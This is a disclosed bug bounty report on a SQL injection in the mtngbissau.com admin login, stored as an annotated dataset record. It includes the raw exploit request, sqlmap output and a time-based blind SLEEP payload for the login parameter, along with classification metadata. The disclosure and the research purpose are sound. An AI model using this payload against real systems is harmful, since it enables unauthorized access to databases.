{
  "reported_to": "MTN Group",
  "reported_by": "z3lox ",
  "title": "SQL Injection on the administrator panel",
  "content": "\nHello team. The admin panel of the website is mtngbissau.com or is vulnerable to sql attack via https://mtngbissau.com/webadmin/index.php\nRequest\nCode 544 Bytes\n1POST /webadmin/index.php HTTP/1.1\n2Host: mtngbissau.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://mtngbissau.com/webadmin/index.php\n8Content-Type: application/x-www-form-urlencoded\n9Content-Length: 21\n10Connection: close\n11Cookie: PHPSESSID=74db1535be320f591b6106253ad77191; SERVERID68971=262072|Xq8Kv|Xq8Ip\n12Upgrade-Insecure-Requests: 1\n13\n14login=user'&pass=uesse\nConfirmation of the vulnerability with sqlmap\nCode 662 Bytes\n1[*] starting @ 21:06:44 /2020-05-03/\n2\n3[18:05:44] [INFO] parsing HTTP request from 'post'\n4[18:06:10] [INFO] resuming back-end DBMS 'mysql' \n5[18:06:24] [INFO] testing connection to the target URL\n6sqlmap resumed the following injection point(s) from stored session:\n7---\n8Parameter: login (POST)\n9    Type: time-based blind\n10    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n11    Payload: login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg&pass=admin\n12---\n13[18:06:45] [INFO] the back-end DBMS is MySQL\n14back-end DBMS: MySQL >= 5.0.12\n15[18:06:45] [INFO] fetched data logged to text files under '/home/kira/.sqlmap/output/mtngbissau.com'\n16\n17\nImpact\nWeb application is vulnerable to SQL injection, allowing access to data\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1627545000,
  "report_url": "https://hackerone.com/reports/865436",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the admin panel login page at https://mtngbissau.com/webadmin/index.php"
    ],
    [
      2,
      "Enter a SQL injection payload in the login field (e.g., `user'`) and submit the form"
    ]
  ],
  "vuln_description": "The admin panel of the website is vulnerable to SQL injection via the login parameter, allowing an attacker to execute arbitrary SQL queries and potentially gain unauthorized access to the database.",
  "reason": "The vulnerability is straightforward to discover as it involves a simple SQL injection in a login form, a common and well-documented attack vector. The attack does not require multiple components, complex state manipulation, or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability involves manipulating the login parameter to inject malicious SQL code, which is not directly related to the AuthN/AuthZ bypass or IDOR methodologies described. The methodologies focus on swapping user sessions or resource IDs within the same application context, whereas SQL injection is a different class of vulnerability that exploits improper input sanitization.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The SQL injection vulnerability in the report was identified via a time-based blind SQLi payload in the 'login' parameter. The methodology includes analyzing parameters from logged requests and testing them with simple payloads (e.g., SLEEP-based delays for time-based SQLi). Since the detection of this vulnerability relies on observing server response delays (same-channel detection) and uses a standard payload (no custom filter bypass), it aligns with the 'Simple Payload' testing methodology. The parameter 'login' would be flagged as injectable during step 3/4 of the methodology.",
    "is_simple_injection": true
  }
}